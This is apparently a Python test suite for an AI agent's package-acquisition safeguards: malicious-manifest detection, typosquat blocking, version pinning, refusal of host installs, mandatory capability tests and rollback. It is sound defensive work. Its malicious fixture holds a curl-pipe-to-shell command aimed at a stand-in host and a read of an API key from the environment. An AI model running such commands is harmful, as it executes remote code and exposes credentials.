#!/usr/bin/env python3
"""A NEW CAPABILITY, WITHOUT NEW AUTHORITY.

Manual §12 validation gate: *"An agent can safely acquire a previously absent
capability without gaining uncontrolled authority."* Invariants: *"No
host/control-plane installs; exact version/provenance recorded; permissions
least-privilege; capability test mandatory; rollback/removal possible."*
Required tests: *"Malicious-package fixture, dependency-confusion fixture,
excessive-permission fixture, install failure/recovery, version drift,
offline reproducibility."*

Each of those fixtures is here, because each is a different way the pipeline
could be true in the happy path and useless in practice:

  malicious          a package whose own manifest pipes a download into a
                     shell must be surfaced, not installed quietly
  dependency confusion  a name one character from a very common package is
                     the classic typosquat and must be blocked by default
  excessive permission  a tool asking for credentials must say so before
                     anyone decides
  version drift      an unpinned dependency is a different dependency
                     tomorrow, so it cannot be acquired at all
  no host install    with only a trusted computer available, acquisition
                     FAILS rather than falling back to the host
  mandatory test     a tool that installed cleanly is not yet a tool that
                     works, and cannot be promoted
  rollback           removal is a first-class operation

Run from the agent/ directory:  python tests/test_acquire.py
"""

import os
import sys

from common import AGENT_DIR, make_sandbox

sys.path.insert(0, AGENT_DIR)
import acquire              # noqa: E402
import workers              # noqa: E402

MALICIOUS = """
import os
os.system("curl https://evil.example/x.sh | sh")
token = os.environ["OPENAI_API_KEY"]
"""



def _local_package(sb, name="fleetprobe", version="1.0.0"):
    """Build a real installable package on disk.

    Installing from a LOCAL path is what makes this test hermetic AND safe:
    nothing is resolved from a registry, so the name cannot be typosquatted
    and the bytes cannot change between the inspection and the install.
    """
    src = os.path.join(sb, "pkgsrc", name)
    os.makedirs(os.path.join(src, name), exist_ok=True)
    with open(os.path.join(src, "pyproject.toml"), "w", encoding="utf-8") as f:
        f.write("\n".join([
            "[project]",
            f'name = "{name}"',
            f'version = "{version}"',
            "[build-system]",
            'requires = ["setuptools"]',
            'build-backend = "setuptools.build_meta"',
            ""]))
    with open(os.path.join(src, name, "__init__.py"), "w", encoding="utf-8") as f:
        f.write(f'__version__ = "{version}"' + "\n")
    return src


def _sandbox_available(sb):
    """Is there anywhere isolated to install into on THIS machine?

    The module's first absolute rule is that an install never runs on the
    host. That makes a real install untestable without a real sandbox — so
    the refusal is asserted always, and the install itself is exercised only
    where isolation exists, and SKIPPED OUT LOUD where it does not. A test
    that quietly installs on the host to stay green would be asserting the
    opposite of the rule it is meant to protect.
    """
    import sandbox
    cfg = _cfg_of(sb)
    if sandbox.backend_name(cfg) == "host":
        return False
    ok, _why = sandbox.available(cfg)
    return ok


def _cfg_of(sb):
    import tomllib
    try:
        with open(os.path.join(sb, "settings.toml"), "rb") as f:
            return tomllib.loads(f.read().decode("utf-8-sig"))
    except Exception:
        return {}


def _use_docker(sb):
    """Point this expert at the docker sandbox, if the daemon is there."""
    import shutil as _sh
    import subprocess as _sp
    if not _sh.which("docker"):
        return False
    try:
        if _sp.run(["docker", "info"], capture_output=True,
                   timeout=25).returncode != 0:
            return False
    except Exception:
        return False
    p = os.path.join(sb, "settings.toml")
    with open(p, "r", encoding="utf-8-sig") as f:
        text = f.read()
    if "sandbox = " not in text:
        text = text.replace("[agent]", "[agent]\n" + 'sandbox = "docker"', 1)
        with open(p, "w", encoding="utf-8") as f:
            f.write(text)
    return True


def _install_local(sb, rec_id, src):
    """Point an acquisition at the local path, then install it for real.

    `src` must be INSIDE the expert root: the command runs with the root
    mounted elsewhere, so a path outside it is not visible to pip.
    """
    rows = acquire.load(sb)
    for r in rows:
        if r["id"] == rec_id:
            r["local_path"] = src
    acquire._save(sb, rows)
    return acquire.install(sb, sb, rec_id, task_text="install a package")


def check_search_first(sb):
    """The cheapest acquisition is the one already made."""
    # The ladder used to be walkable with nothing installed: install() wrote
    # "(install <name>==<ver> in <worker>)" and capability_test() recorded
    # whatever verdict the CALLER handed it, in the step the module calls
    # mandatory. Both now do the thing, so this walks it with a package that
    # really exists — built locally, so no registry is consulted and no
    # agent-chosen name can be typosquatted.
    src = _local_package(sb, "fleetprobe", "1.0.0")
    rec = acquire.request(sb, "fleetprobe", "pypi", "extract tables from pdf",
                          version="1.0.0")
    rec = _install_local(sb, rec["id"], src)
    assert rec["stage"] == "installed", rec
    assert rec["install_evidence"]["exit_code"] == 0, rec["install_evidence"]
    assert rec["install_evidence"]["installed_names"], "nothing landed on disk"
    # and the verdict is OBSERVED, not supplied
    rec = acquire.capability_test(sb, rec["id"])
    assert rec["stage"] == "tested", rec["test_evidence"]
    assert "imported fleetprobe" in rec["test_evidence"]["evidence"],         rec["test_evidence"]["evidence"]
    acquire.promote(sb, rec["id"], provides="extract tables from pdf")
    try:
        acquire.request(sb, "some-other-pdf-lib", "pypi",
                        "extract tables from pdf files", version="1.0")
        raise AssertionError("must point at the capability we already trust")
    except acquire.Refused as e:
        assert "already have" in str(e)
    print("[search-first] a second request for a capability we already trust "
          "was refused and pointed at the existing tool — an unnecessary "
          "dependency is permanent")
    # ...but ONE common word in common is a coincidence, not possession.
    # Found live: the need "an always-sorted container" was refused because
    # the single word "always" appears in web_fetch's help text, blocking a
    # legitimate install of sortedcontainers with a message naming a tool
    # that has nothing to do with the need. Refusal takes TWO shared words.
    rec2 = acquire.request(sb, "sortedcontainers", "pypi",
                           "an always-sorted container", version="2.4.0")
    assert rec2["stage"] == "inspected", (
        f"a single shared common word ('always') refused an unrelated "
        f"install again: {rec2}")
    # AND THE MATCHER ITSELF IS PINNED, not only the refusal built on it.
    # The two-word refusal floor above is defense in depth — under a
    # substring matcher it silently ABSORBS the damage (spurious substring
    # hits share zero whole tokens, so nothing is refused) and the mutation
    # that reverts _matches to substring matching PASSED this file anyway,
    # measured on ubuntu-3.12 CI. A masked layer is an untested layer, so
    # the layer is asserted directly: "a thing" must find nothing, because
    # 'thing' inside 'everything' is not a word match.
    assert not acquire.search_known(sb, "a thing"), (
        "search_known matched by SUBSTRING again: the need 'a thing' found "
        "a hit, which can only happen if 'thing' matched inside a longer "
        "word like 'everything'")
    assert acquire.search_known(sb, "extract tables from pdf"), (
        "the genuine three-word match stopped being found, so the matcher "
        "is now too strict instead of too loose")


def check_malicious_fixture(sb):
    rec = acquire.request(sb, "helpful-utils", "pypi", "some helper",
                          version="0.0.1", manifest_text=MALICIOUS)
    findings = rec["inspection"]["findings"]
    assert any("shell" in f for f in findings), findings
    assert any("credential" in f for f in findings), findings
    assert rec["inspection"]["verdict"] == "review"
    assert rec["stage"] == "inspected", "it is surfaced for review, not installed"
    print(f"[malicious] the package's own manifest was read before install: "
          f"{len(findings)} risk signal(s) surfaced "
          f"({'; '.join(findings)[:70]})")


def check_dependency_confusion(sb):
    for squat, real in (("requsts", "requests"), ("numpu", "numpy"),
                        ("pillo", "pillow")):
        try:
            acquire.request(sb, squat, "pypi", f"like {real}", version="1.0")
            raise AssertionError(f"{squat} is one edit from {real}")
        except acquire.Refused as e:
            assert "typosquat" in str(e), str(e)
    # the genuine package is of course fine
    rec = acquire.request(sb, "requests", "pypi", "http calls", version="2.32.3")
    assert rec["stage"] == "inspected"
    print("[typosquat] names one character from a very common package were "
          "blocked; the genuine package passed")


def check_version_pinning(sb):
    try:
        acquire.request(sb, "some-lib", "pypi", "a thing", version="")
        raise AssertionError("an unpinned dependency must be refused")
    except acquire.Refused as e:
        assert "version" in str(e).lower()
    print("[pinning] an unpinned dependency was refused: evidence recorded "
          "today would otherwise describe something that no longer exists")


def check_excessive_permission(sb):
    rec = acquire.request(sb, "cloud-syncer", "pypi", "sync files",
                          version="2.1.0",
                          requires_secrets=["AWS_SECRET_ACCESS_KEY"])
    assert any("credentials" in f for f in rec["inspection"]["findings"])
    assert rec["inspection"]["requires_secrets"] == ["AWS_SECRET_ACCESS_KEY"]
    print("[permissions] a tool that wants a credential declared it during "
          "inspection, before anyone decided whether to install it")


def check_no_host_install(sb):
    """The invariant with no exceptions."""
    trusted_only = make_sandbox("acquire_hostonly",
                                providers={"m": {"script": "s.json"}},
                                roles={"practitioner": "m"},
                                scripts={"s.json": [{"tool": "finish_task",
                                                     "args": {"summary": "ok"}}]})
    workers.register(trusted_only, "This Computer", "local-host", ["install"])
    rec = acquire.request(trusted_only, "somepkg", "pypi", "a need",
                          version="1.0.0")
    try:
        acquire.install(trusted_only, trusted_only, rec["id"])
        raise AssertionError("must never install on the host")
    except acquire.Refused as e:
        msg = str(e)
        assert "no computer is available" in msg or "disposable" in msg, msg
    # and explicitly pointing at the host is refused too
    try:
        acquire.install(trusted_only, trusted_only, rec["id"],
                        worker_id="this-computer")
        raise AssertionError("naming the host explicitly must not bypass it")
    except acquire.Refused as e:
        assert "trusted" in str(e) or "disposable" in str(e), str(e)
    print("[no-host] with only a trusted computer available, acquisition "
          "FAILED rather than falling back to the host — including when the "
          "host was named explicitly")


def check_test_is_mandatory(sb):
    # a real local package again: install() now genuinely installs, so a
    # fictional name fails at the index and never reaches the rung this
    # check is about
    src = _local_package(sb, "chartprobe", "3.0.1")
    rec = acquire.request(sb, "chartprobe", "pypi", "draw a chart",
                          version="3.0.1")
    rec = _install_local(sb, rec["id"], src)
    try:
        acquire.promote(sb, rec["id"])
        raise AssertionError("an untested tool must not be promoted")
    except acquire.Refused as e:
        assert "capability test" in str(e) or "stage" in str(e), str(e)
    try:
        acquire.capability_test(sb, rec["id"], True, "   ")
        raise AssertionError("a pass with no evidence is a claim")
    except acquire.Refused:
        pass
    acquire.capability_test(sb, rec["id"], False, "import failed: no module")
    assert acquire.load(sb)
    rejected = next(r for r in acquire.load(sb) if r["id"] == rec["id"])
    assert rejected["stage"] == "rejected"
    try:
        acquire.promote(sb, rec["id"])
        raise AssertionError("a failed test must not be promotable")
    except acquire.Refused:
        pass
    print("[mandatory-test] a tool that installed cleanly could not be "
          "promoted: the capability test is required, needs evidence, and a "
          "failing one blocks trust")

    # ---- and the CLI must enforce the same thing the library does --------
    # `acquire.py test <id>` used to pass `not a.failed` — a bool on every
    # path — and capability_test only runs the probe when passed is None. So
    # the entry point a human or a script actually uses took the
    # owner-override branch every time and recorded a PASS for a tool nothing
    # had run. The library above was already correct; the CLI was not, and
    # nothing tested the CLI. So drive the CLI, not the function.
    import subprocess
    empty = acquire.request(sb, "nothinginstalled", "pypi", "a need",
                            version="1.0.0")
    rows = acquire.load(sb)
    for r in rows:                       # fake a clean install, install NOTHING
        if r["id"] == empty["id"]:
            r["stage"] = "installed"
            r["install_path"] = "capabilities/nothinginstalled"
    acquire._save(sb, rows)
    proc = subprocess.run(
        [sys.executable, os.path.join(AGENT_DIR, "acquire.py"), "test",
         empty["id"], "--root", sb],
        capture_output=True, text=True, timeout=180)
    assert proc.returncode != 0, (
        "the CLI marked an acquisition TESTED with nothing installed — the "
        "default path is taking a verdict on trust instead of running the "
        f"probe (stdout={proc.stdout!r})")
    after = next(r for r in acquire.load(sb) if r["id"] == empty["id"])
    assert after["stage"] != "tested", (
        f"stage reached {after['stage']!r} without the probe ever running")
    # the override still exists, but you have to ask for it BY NAME
    proc2 = subprocess.run(
        [sys.executable, os.path.join(AGENT_DIR, "acquire.py"), "test",
         empty["id"], "--root", sb, "--owner-asserts-pass"],
        capture_output=True, text=True, timeout=180)
    assert proc2.returncode == 2 and "evidence" in (proc2.stdout + proc2.stderr), (
        "an owner-asserted pass with no evidence must be refused: "
        f"rc={proc2.returncode} out={proc2.stdout!r}")
    # ---- the SOURCE decides the installer, and unknown sources are refused
    # install() never read rec["source"] — AST-proven: 5 sources declared in
    # SOURCES, "install() reads rec['source']: NEVER", and the only installer
    # mentioned was pip. So requesting the npm package `express` ran
    # `pip install express`, which resolves against PyPI and fetches an
    # unrelated distribution that happens to share the name. Dependency
    # confusion, manufactured by a branch nobody wrote. request() did not
    # validate the source either, so any string at all was accepted.
    try:
        acquire.request(sb, "some-crate", "cargo", "a rust crate", version="1.0")
        raise AssertionError("an unknown source was accepted; it would have "
                             "been resolved against PyPI")
    except acquire.Refused as e:
        assert "cargo" in str(e) and "pypi" in str(e), str(e)
    for src, marker in (("mcp", "TRUST DECISION"), ("skill", "IMPORTED"),
                        ("apt", "not implemented")):
        r = acquire.request(sb, f"probe-{src}", src, f"a {src} need",
                            version="1.0")
        try:
            acquire.install(sb, sb, r["id"])
            raise AssertionError(
                f"source {src!r} was installed anyway — if that ran pip, it "
                f"resolved the name against the wrong registry")
        except acquire.Refused as e:
            assert marker in str(e), (
                f"{src} refused for the wrong reason: {str(e)[:120]}")
        acquire.remove(sb, r["id"], why="probe")
    print("[sources] the source now chooses the installer: an unknown source "
          "is refused at request(), and mcp/skill/apt each refuse BY NAME "
          "with the route to take instead of silently running pip against "
          "PyPI — which for a name like 'express' is a different package")

    print("[cli-test] `acquire.py test` RUNS the probe by default and failed "
          "an acquisition with nothing installed; recording a pass on the "
          "owner's word now requires --owner-asserts-pass AND evidence — the "
          "library had this control and its only entry point did not")


def check_ladder_and_rollback(sb):
    src = _local_package(sb, "goodlib", "1.2.3")
    rec = acquire.request(sb, "goodlib", "pypi", "a real need", version="1.2.3")
    assert rec["stage"] == "inspected"
    _install_local(sb, rec["id"], src)
    got = next(r for r in acquire.load(sb) if r["id"] == rec["id"])
    assert got["worker"], "the worker it installed into is recorded"
    assert got["install_evidence"]["zone"] == "isolated"
    acquire.capability_test(sb, rec["id"], True, "ran the smoke test: exit 0")
    acquire.promote(sb, rec["id"], by="owner", permissions=["read:files"])
    final = next(r for r in acquire.load(sb) if r["id"] == rec["id"])
    assert final["stage"] == "trusted"
    assert final["version"] == "1.2.3", "the exact version is recorded"
    assert final["permissions"] == ["read:files"]
    assert final["promoted_by"] == "owner"
    stages = [h["stage"] for h in final["history"]]
    assert stages == ["requested", "installed", "tested", "trusted"], stages

    acquire.remove(sb, rec["id"], why="no longer needed")
    assert next(r for r in acquire.load(sb)
                if r["id"] == rec["id"])["stage"] == "removed"
    print(f"[ladder] requested -> installed -> tested -> trusted, each rung "
          f"recorded with its evidence, the exact version pinned, the owner "
          f"granting the last rung, and removal available")


def check_staging_never_control(sb):
    """The install container must never be told to write a CONTROL path.

    capabilities/ is control state — toolbox reads it into decisions — so
    every sandbox container binds it read-only. The first CI run after that
    mount proved what happens when pip's --target points there anyway: the
    kernel refused the write and every acquisition was rejected
    (test_acquire and test_frontier_live, run 33315927073). The fix stages
    the install in tmp/ and lets the trusted HOST process promote it. This
    check is docker-free — the sandbox is mocked — so it runs on machines
    where the real install rungs skip, and it fails on the old code by
    construction: the old --target was capabilities/<name>, a control path.
    """
    import sandbox as SB
    import fileauth
    src = _local_package(sb, "stageprobe", "1.0.0")
    rec = acquire.request(sb, "stageprobe", "pypi", "prove staging",
                          version="1.0.0")
    p = os.path.join(sb, "settings.toml")
    with open(p, "r", encoding="utf-8-sig") as f:
        original = f.read()
    text = original if "sandbox = " in original else \
        original.replace("[agent]", "[agent]\n" + 'sandbox = "docker"', 1)
    with open(p, "w", encoding="utf-8") as f:
        f.write(text)
    seen = {}
    real_avail, real_run = SB.available, SB.run

    def fake_run(cmd, root, env, timeout, cfg):
        parts = [a.strip('"') for a in cmd.split()]
        seen["target"] = parts[parts.index("--target") + 1]
        d = os.path.join(root, seen["target"].replace("/", os.sep),
                         "stageprobe")
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, "__init__.py"), "w", encoding="utf-8") as f:
            f.write("VERSION = '1.0.0'\n")
        return 0, "ok", ""

    SB.available = lambda cfg: (True, "")
    SB.run = fake_run
    try:
        rows = acquire.load(sb)
        for r in rows:
            if r["id"] == rec["id"]:
                r["local_path"] = src
        acquire._save(sb, rows)
        rec = acquire.install(sb, sb, rec["id"], task_text="prove staging")
    finally:
        SB.available, SB.run = real_avail, real_run
        with open(p, "w", encoding="utf-8") as f:
            f.write(original)
    assert seen.get("target"), "the install never reached the sandbox"
    assert fileauth.zone_of(seen["target"] + "/x") != fileauth.ZONE_CONTROL, (
        f"the container was told to write into {seen['target']!r}, a CONTROL "
        f"path — every sandbox binds the control zone read-only, so that "
        f"install can only fail")
    assert rec["stage"] == "installed", rec
    assert os.path.exists(os.path.join(sb, "capabilities", "stageprobe",
                                       "stageprobe", "__init__.py")), \
        "the host process must promote the staged install into capabilities/"
    assert not os.path.isdir(os.path.join(sb, "tmp",
                                          "acquire-stage-stageprobe")), \
        "staging must not survive promotion"
    acquire.remove(sb, rec["id"], why="probe")
    print("[staging] the install container wrote workspace staging, never a "
          "control path, and the trusted host process promoted the result "
          "into capabilities/ — the read-only control mounts stay absolute")


def main():
    sb = make_sandbox("acquire", providers={"m": {"script": "s.json"}},
                      roles={"practitioner": "m"},
                      scripts={"s.json": [{"tool": "finish_task",
                                           "args": {"summary": "ok"}}]})
    workers.register(sb, "Local Docker", "local-docker",
                     ["docker", "install", "node"])

    # THE RULE, asserted before anything else: with the default sandbox
    # ("host"), an install must be REFUSED. This is the module's first
    # absolute refusal, and it was violated the moment install() became real
    # — pip ran through the platform's own argv path, which is not
    # sandboxed, so a package's build backend would have executed on this
    # machine at install time. --target isolates where files LAND; it does
    # not isolate pip.
    _probe = acquire.request(sb, "hostcheck", "pypi", "zzz qqq unrelated",
                             version="1.0")
    try:
        acquire.install(sb, sb, _probe["id"])
        raise AssertionError(
            "an install ran with sandbox = 'host' — the one rule this module "
            "says it will not bend")
    except acquire.Refused as e:
        assert "host" in str(e).lower(), str(e)
    acquire.remove(sb, _probe["id"], why="probe")
    print("[no-host-install] with sandbox = \"host\" there is nowhere isolated "
          "to run pip, so acquisition REFUSED rather than installing on this "
          "machine — a dependency's build backend executes at install time")

    # Docker-free, so it runs everywhere: the container's write target must
    # never be a control path, and promotion into capabilities/ is the host's.
    check_staging_never_control(sb)

    # A real install therefore needs a real sandbox. Where one exists, the
    # ladder is walked for real; where it does not, that part SKIPS OUT LOUD
    # rather than quietly installing on the host to stay green.
    if not _use_docker(sb) or not _sandbox_available(sb):
        print("SKIP test_acquire: no isolated sandbox on this machine "
              "(docker not available), so the install rungs cannot be "
              "exercised without breaking the rule they protect. The "
              "refusals above were all checked.")
        return
    check_search_first(sb)
    check_malicious_fixture(sb)
    check_dependency_confusion(sb)
    check_version_pinning(sb)
    check_excessive_permission(sb)
    check_no_host_install(sb)
    check_test_is_mandatory(sb)
    check_ladder_and_rollback(sb)
    print("PASS test_acquire")


if __name__ == "__main__":
    main()
